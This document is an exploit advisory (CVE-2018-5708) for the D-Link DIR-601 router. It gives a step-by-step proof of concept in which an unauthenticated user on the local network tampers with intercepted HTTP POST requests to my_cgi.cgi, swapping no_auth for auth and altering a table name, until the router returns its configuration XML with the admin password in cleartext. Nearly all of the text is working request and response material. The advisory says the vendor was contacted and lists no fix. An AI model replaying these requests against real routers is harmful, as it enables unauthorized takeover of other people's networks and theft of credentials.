# Exploit Title: DLink DIR-601 Unauthenticated Admin password disclosure
# Google Dork: N/A
# Date: 12/24/2017
# Exploit Author: Kevin Randall
# Vendor Homepage: https://www.dlink.com
# Software Link: N/A
# Version: Firmware: 2.02NA Hardware Version B1
# Tested on: Windows 10 + Mozilla Firefox
# CVE : CVE-2018-5708

*Been in contact with William Brown CISO of Dlink and disclosed to the vendor*

1. Description

Having local access to the network but being unauthenticated to the administrator panel, a user can disclose the built in Admin username/password to access the admin panel


2. Proof of Concept
(For proof of concept, the real Admin password is "thisisatest"
Step 1: Access default gateway/router login page

Step 2: Login with Username Admin and put any random password: (This example the password is test)

POST /my_cgi.cgi?0.06201226210472943 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/login_real.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
DNT: 1
Connection: close

request=login&admin_user_name=YWRtaW4A&admin_user_pwd=dGVzdA==&user_type=0

Step 3: Clear Password that was set:

POST /my_cgi.cgi?0.06201226210472943 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/login_real.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
DNT: 1
Connection: close

request=login&admin_user_name=YWRtaW4A&admin_user_pwd=&user_type=0


Step 4: The following POST request will come back or a variant:

POST /my_cgi.cgi?0.322727424911867 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/back.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
DNT: 1
Connection: close

request=no_auth&request=load_settings&table_name=fw_ver&table_name=hw_ver

Change the request=no_auth to "request=auth"


POST /my_cgi.cgi?0.322727424911867 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/back.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
DNT: 1
Connection: close

request=auth&request=load_settings&table_name=fw_ver&table_name=hw_ver

Step 5: Forward the request:



Step 6: Forward the following request:

POST /my_cgi.cgi?0.8141419425197141 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/back.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
DNT: 1
Connection: close

request=show_message


Step 7: You will then be presented with the following: "Invalid user name or password, please try again"

Step 8: Click Continue



Step 9: You will see a POST request come back similar to the following:

POST /my_cgi.cgi?0.12979015154204587 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/login.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
DNT: 1
Connection: close

request=no_auth&request=load_settings&table_name=get_restore_default

Step 10: Change the parameters "request=no_auth" to "request=auth" and "table_name=get_restore_default" to "table_name=restore_default"

POST /my_cgi.cgi?0.12979015154204587 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/login.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
DNT: 1
Connection: close

request=auth&request=load_settings&table_name=restore_default


Step 11: Forward the request:

Step 12: You will see the following POST request come back or a variant of it:

POST /my_cgi.cgi?0.5566044428265032 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.0.1/wizard_default.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 278
DNT: 1
Connection: close

request=no_auth&request=load_settings&table_name=get_restore_default&table_name=wan_settings&table_name=wan_static&table_name=wan_pppoe&table_name=wan_pptp&table_name=wan_l2tp&table_name=wireless_settings&table_name=admin_user&table_name=time&table_name=fw_ver&table_name=hw_ver


Step 13: In BurpSuite, right click on the POST request and choose: "Do Intercept" "Response from this request":


Step 14: In XML cleartext, configuration information is obtained including the Admin username and password "thisisatest"


HTTP/1.1 200 OK
Content-type: text/xml
Connection: close
Date: Sat, 06 Jan 2018 13:33:26 GMT
Server: lighttpd/1.4.28
Content-Length: 2414

<?xml version="1.0" encoding="UTF-8"?><root><restore_default>0</restore_default><wan_settings><wan_type>0</wan_type><wan_mac>44:8a:5b:8d:ba:13</wan_mac><primary_dns></primary_dns><secondary_dns></secondary_dns><enable_advanced_dns>1</enable_advanced_dns></wan_settings><wan_static><static_ip_addr>0.0.0.0</static_ip_addr><static_subnet_mask>0.0.0.0</static_subnet_mask><static_gateway>0.0.0.0</static_gateway><static_mtu>1500</static_mtu></wan_static><wan_pppoe><pppoe_conn_type>0</pppoe_conn_type><pppoe_user_name></pppoe_user_name><pppoe_user_pwd></pppoe_user_pwd><pppoe_service_name></pppoe_service_name><pppoe_ip_addr>0.0.0.0</pppoe_ip_addr><pppoe_conn_mode>on_demand</pppoe_conn_mode><pppoe_max_idle_time>300</pppoe_max_idle_time><pppoe_mtu>1492</pppoe_mtu></wan_pppoe><wan_pptp><pptp_conn_type>0</pptp_conn_type><pptp_ip_addr>0.0.0.0</pptp_ip_addr><pptp_subnet_mask>0.0.0.0</pptp_subnet_mask><pptp_gateway>0.0.0.0</pptp_gateway><pptp_server_ip></pptp_server_ip><pptp_user_name></pptp_user_name><pptp_user_pwd></pptp_user_pwd><pptp_conn_mode>on_demand</pptp_conn_mode><pptp_max_idle_time>300</pptp_max_idle_time><pptp_mtu>1400</pptp_mtu></wan_pptp><wan_l2tp><l2tp_conn_type>0</l2tp_conn_type><l2tp_ip_addr>0.0.0.0</l2tp_ip_addr><l2tp_subnet_mask>0.0.0.0</l2tp_subnet_mask><l2tp_gateway>0.0.0.0</l2tp_gateway><l2tp_server_ip></l2tp_server_ip><l2tp_user_name></l2tp_user_name><l2tp_user_pwd></l2tp_user_pwd><l2tp_conn_mode>on_demand</l2tp_conn_mode><l2tp_max_idle_time>300</l2tp_max_idle_time><l2tp_mtu>1400</l2tp_mtu></wan_l2tp><wireless_settings><enable_wireless>1</enable_wireless><wireless_schedule>Always</wireless_schedule><ssid>HomeAP</ssid><channel>3</channel><auto_channel>0</auto_channel><dot11_mode>11gn</dot11_mode><channel_width>0</channel_width><ssid_broadcast>1</ssid_broadcast></wireless_settings><admin_user><admin_user_name>admin</admin_user_name><admin_user_pwd>thisisatest</admin_user_pwd><admin_level>1</admin_level></admin_user><time><zone_index>12</zone_index><time_zone>-80</time_zone><ntp_enable>1</ntp_enable><ntp_server>time.nist.gov</ntp_server><manual_year>2011</manual_year><manual_month>1</manual_month><manual_day>1</manual_day><manual_hour>0</manual_hour><manual_min>0</manual_min><manual_sec>0</manual_sec></time><fw_ver>2.02NA</fw_ver><build_ver>01</build_ver><fw_date>Tue, 11 Nov 2014</fw_date><fw_region>NA</fw_region><hw_ver>B1</hw_ver></root>





3. Solution:
N/A. Unknown as of the moment